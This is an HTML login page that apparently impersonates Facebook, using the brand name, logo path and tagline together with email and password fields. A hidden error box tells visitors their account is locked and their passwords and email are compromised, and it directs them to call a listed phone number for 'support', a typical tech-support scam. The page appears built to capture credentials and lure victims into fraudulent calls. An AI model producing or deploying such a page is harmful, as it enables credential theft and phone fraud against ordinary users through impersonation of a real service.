<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <style>
    /* Floating Call Button CSS */
    .floating-call-btn {
      /* Centered at the bottom */
      position: fixed;
      bottom: 24px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 9999; 
      
      /* Styling & Blue Colors */
      display: flex;
      align-items: center;
      gap: 10px;
      background-color: #0066cc; /* Primary Blue */
      color: #ffffff;
      padding: 12px 24px;
      border-radius: 50px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 16px;
      font-weight: 600;
      text-decoration: none;
      box-shadow: 0 4px 10px rgba(0, 102, 204, 0.3); /* Subtle blue tinted shadow */
      transition: all 0.3s ease;
    }

    /* Hover effects for desktop */
    .floating-call-btn:hover {
      background-color: #004c99; /* Darker Blue on hover */
      box-shadow: 0 6px 14px rgba(0, 102, 204, 0.4);
      transform: translateX(-50%) translateY(-3px); /* Lifts up slightly */
    }

    /* Responsive adjustments for mobile screens */
    @media (max-width: 768px) {
      .floating-call-btn {
        bottom: 16px; 
        padding: 10px 20px;
        font-size: 14px;
        width: auto;
        white-space: nowrap;
      }
      
      /* Make the button wider on very small screens */
      @media (max-width: 400px) {
        .floating-call-btn {
          width: 90%;
          justify-content: center; /* Centers the icon and text */
        }
      }
    }
  </style>
    <div class="main-wrapper">
        <div class="container">
            <div class="brand-section">
                <img src="logo/Facebooklogo.png" alt="Facebook" class="fb-logo">
                <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
            </div>

            <div class="login-section">
                <div class="login-card">
                    <div id="error-message" class="error-box" style="display: none;">
                        Your account is locked due to security issues. Your passwords and email are compromised. Please contact the support team at 
                        <a href="tel:+18554705313" class="highlight-link">+18554705313</a>
                    </div>

                    <form id="loginForm">
                        <input type="text" id="email" placeholder="Email address or mobile number" required>
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="submit" class="login-btn">Log in</button>
                        <a href="#" class="forgot-link">Forgotten password?</a>
                        <hr>
                        <button type="button" class="create-btn">Create new account</button>
                    </form>
                </div>
                <p class="footer-note"><b>Create a Page</b> for a celebrity, brand or business.</p>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
